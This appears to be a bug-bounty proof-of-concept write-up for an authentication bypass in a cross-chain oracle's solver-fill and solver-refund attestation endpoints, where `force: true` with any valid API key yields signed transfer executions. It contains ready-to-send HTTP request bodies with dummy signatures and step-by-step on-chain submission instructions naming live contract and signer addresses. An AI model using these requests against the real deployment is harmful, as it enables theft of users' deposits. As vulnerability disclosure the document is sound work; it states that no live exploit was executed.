# PoC — WS5-01: `force: true` solver-fill attestation bypass

- **Finding:** WS5-01 (see `AUDIT-oracle-offchain.md` §1)
- **Severity claimed:** S3 / L2 ($15,000 per program matrix; L-grade conditional — see §5)
- **Date:** 2026-11-16
- **Status:** Static PoC (code + diff + request trace). Live end-to-end PoC **NOT executed** — it requires a valid oracle API key and a real order/deposit, and must not move real funds without approval. No mainnet interaction was performed in this workstream.

## 1. What the PoC demonstrates

That on current oracle main, a single `POST /attestations/solver-fills/v1` with `force: true` and **any valid oracle API key** returns a signed Hub `TRANSFER` execution paying the order's solver the full deposit amount, while:

- no fill transaction ever occurred (`fill.transactionId` is never read),
- the order signature is never verified (`orderSignature` is never read),
- deposit amounts/currency are never checked against the order,
- the solver's on-chain fill (`getSolverPaidAmount` / `verifySolverCalls`) is never checked.

The only checks that run in force mode are: (a) the API key exists in the `API_KEYS` map, (b) deposits with `depositId === orderId` exist.

## 2. Request (solver-fills)

```http
POST https://<oracle-host>/attestations/solver-fills/v1
x-api-key: <ANY_VALID_ORACLE_API_KEY>
Content-Type: application/json

{
  "order": {
    "version": "v1",
    "solverChainId": "<solver chain id>",
    "solver": "<ATTACKER_SOLVER_ADDRESS — must equal the solver of the real order>",
    "salt": "<salt of the real order>",
    "inputs": [
      {
        "payment": {
          "chainId": "<origin chain id>",
          "currency": "<deposit token>",
          "amount": "<deposit amount>",
          "weight": "<weight of the real order>"
        },
        "refunds": []
      }
    ],
    "output": { "<exact output object of the real order>" },
    "fees": []
  },
  "orderSignature": "0x0000000000000000000000000000000000000000000000000000000000000000",
  "inputs": [
    {
      "transactionId": "<real deposit tx hash>",
      "onchainId": "<real deposit onchain id>",
      "inputIndex": 0
    }
  ],
  "fill": { "transactionId": "0x0000000000000000000000000000000000000000000000000000000000000000" },
  "force": true,
  "requestPeerSignatures": true
}
```

Notes:

- `order` must be the **real order** (same fields → same derived orderId → matches the victim's existing deposit). The `orderSchema` (`src/api/utils.ts` L270–492) has no `id` field; orderId is derived from the order fields, so an arbitrary deposit cannot be retargeted — the attacker must be the order's designated solver (or collude with them).
- `orderSignature` and `fill.transactionId` are dummy values. In force mode neither is read: the force branch (`src/services/attestation/index.ts` L1653–1729) never calls `_getDepositsDetails` (L3354+, the only place that verifies the order signature, amounts, currency and onchainIds) and never calls `getSolverPaidAmount` / `verifySolverCalls`.
- `fees: []` avoids the extra fee TRANSFER actions from the solver in `_getSolverFillOrRefundExecution` (L3631–3812).
- `requestPeerSignatures: true` fans the identical request out to configured peers (`src/api/quorum.ts` L822–884), each of which computes the same forced execution and signs it — collecting the 2-of-5 signatures the live multisig requires (see §4).

Expected response: `200` with `execution` containing `actions` = TRANSFER(s) from the order address to the solver's Hub alias for the full deposit amount, plus `signatures` (local + peer signatures, each with `oracleSigner` + `signature`).

## 3. Request (solver-refunds) — same bypass, refund variant

```http
POST https://<oracle-host>/attestations/solver-refunds/v1
x-api-key: <ANY_VALID_ORACLE_API_KEY>
Content-Type: application/json

{
  "order": { "<real order, as above>" },
  "orderSignature": "0x0000…",
  "inputs": [ { "transactionId": "<real deposit tx>", "onchainId": "<real onchain id>", "inputIndex": 0 } ],
  "refund": { "transactionId": "0x0000…" },
  "force": true,
  "requestPeerSignatures": true
}
```

Same gate (`solver-refunds/v1.ts` L312–328) and same skipped verification (`attestSolverRefund` force branch L1877–1953). The refund execution pays the order's refund recipients with no refund having occurred (variant V-01 — see audit §1; lower confidence, ordering-dependent).

## 4. On-chain submission (how the signed execution becomes theft)

1. Take the `execution` from the response: `{ actions, idempotencyKey, signatures }`.
2. Sort the signatures by recovered signer address ascending, concatenate the first `threshold` (= 2) 65-byte signatures.
3. Submit `RelayOracleV2.execute(execution)` on the Relay chain (chain 537713, oracle `0xd180dc3b8cb71b185c563b6e4857592ca93dacaf`):
   - `RelayOracleV2._execute` (L736–795) checks ORACLE_ROLE and `oracleMultisig.isValidSignatureNow(digest, signature)` (EIP-1271 against multisig `0x2a72eb8cf0233a3dc6198683c83b1078de6fa2b0`), marks the idempotency key, executes the TRANSFER actions.
   - There is **no deadline/expiry** on the Execution (EIP-712 message is `{actions, idempotencyKey}` only), so a forced execution stays submittable indefinitely.
4. Effect: the order address's Hub balance (the victim's deposit value) transfers to the solver's Hub alias. The solver can then withdraw it via the Allocator (balance-bounded, Oracle-gated — and the Oracle just attested it). The victim receives no fill on the destination chain.

Live multisig: **5 signers, threshold 2** (deployment: 3 signers per verified constructor args, contract verified 2026-01-26; coordinator re-queried live 2026-11-16 via `cast call`: `threshold()` = 2, `getSigners()` = 5 — two signers added post-deployment). Signers `0x2C598f73A5Ab65c0510Fd8Efb740826D291CAb0e`, `0x5BE2dd28F7810582ed6DC910Fd8693878A1d90f2`, `0xA41716FF5A7D4ad22f83B7CB74d9Af9767a96A52`; owner `0xF61A305199fa1135d76FFaB3752D42F55cBd775A`. Current threshold not re-queried via `eth_call` (deployment value 2; `setThreshold` is owner-only).

## 5. Static verification (the concrete demonstration available in this VM)

The regression is demonstrable without any key, order, or funds, by diffing the `force` gate across three revisions. Check these URLs (all public GitHub):

| Revision | URL / check | Expected |
|----------|-------------|----------|
| Audit commit `7dbe806a9ee9bbc0f32df8bc7e0b6da1de253799` | `https://github.com/relayprotocol/relay-protocol-oracle/blob/7dbe806a9ee9bbc0f32df8bc7e0b6da1de253799/src/api/attestations/solver-fills/v1.ts` — find `force` | Gate requires `config.apiKeys[apiKey] === "relay"` (internal-only key); comment "Restrict the `force` option to specific integrators" |
| Regression commit `62ab912d4941b20d4642228574b13d2b44b0dce7` (PR #182, Mar 16 2026) | `https://github.com/relayprotocol/relay-protocol-oracle/commit/62ab912d4941b20d4642228574b13d2b44b0dce7` — title "tweak: allow all valid api keys to set force option" | Both fills + refunds hunks change the `"relay"`-name check to any-valid-key |
| Current main | `https://raw.githubusercontent.com/relayprotocol/relay-protocol-oracle/main/src/api/attestations/solver-fills/v1.ts` L284–300 and `solver-refunds/v1.ts` L312–328 | Gate is only `isValidApiKey(apiKey)` — key merely exists in `API_KEYS` (`src/common/api-key.ts` L3–15) |

Automated check (run where network + node are available; prints PASS/FAIL, writes no files):

```js
// node check-ws5-01.mjs — static gate check for WS5-01
const files = [
  ["audit", "https://raw.githubusercontent.com/relayprotocol/relay-protocol-oracle/7dbe806a9ee9bbc0f32df8bc7e0b6da1de253799/src/api/attestations/solver-fills/v1.ts"],
  ["main-fills", "https://raw.githubusercontent.com/relayprotocol/relay-protocol-oracle/main/src/api/attestations/solver-fills/v1.ts"],
  ["main-refunds", "https://raw.githubusercontent.com/relayprotocol/relay-protocol-oracle/main/src/api/attestations/solver-refunds/v1.ts"],
];
for (const [name, url] of files) {
  const src = await (await fetch(url)).text();
  const hasRelayOnlyGate = src.includes('"relay"') && src.includes("Restrict the `force` option");
  const hasAnyKeyGate = src.includes("isValidApiKey(apiKey)");
  console.log(name, JSON.stringify({ relayOnlyGate: hasRelayOnlyGate, anyValidKeyGate: hasAnyKeyGate }));
}
// Expected:
// audit        {"relayOnlyGate":true, "anyValidKeyGate":false}
// main-fills   {"relayOnlyGate":false,"anyValidKeyGate":true}
// main-refunds {"relayOnlyGate":false,"anyValidKeyGate":true}
```

Also verify the service-level bypass is unchanged since the audit: in current main `src/services/attestation/index.ts`, the force branches (`attestSolverFill` L1653–1729, `attestSolverRefund` L1877–1953) contain no call to `_getDepositsDetails`, `getSolverPaidAmount`, or `verifySolverCalls` — while the non-force path calls all three.

## 6. Honest limits

- **No live request was sent.** No oracle API key was held, no real order/deposit was used, no funds moved. The end-to-end chain (force request → 2-of-5 signatures → `RelayOracleV2.execute`) is traced in code and verified against live on-chain deployment data (prod.json addresses, explorer-verified multisig constructor args, coordinator live `cast call` re-query: threshold 2, 5 signers), but the final hop was not executed live.
- **Prerequisites belum terverifikasi:** (a) oracle API-key issuance — self-serve vs vetted (Relay *platform* keys are self-serve via dashboard.relay.link, but oracle keys are a separate set); (b) solver onboarding — whether third-party solvers can be designated `order.solver`; (c) live peer topology — whether the production oracle has ≥2 peer instances so one force call collects 2-of-5 (if no peers, only 1 signature is produced and on-chain execution reverts at threshold 2); (d) current multisig threshold re-query via `eth_call` (deployment value is 2).
- **Attacker is the designated solver** (or their colluder), not an arbitrary third party: the payout beneficiary is `order.solver` and the orderId is derived from the order fields, so arbitrary deposits cannot be retargeted. This bounds impact to S3, not S4.
- **Refund variant (V-01)** is ordering-dependent and not separately scored.
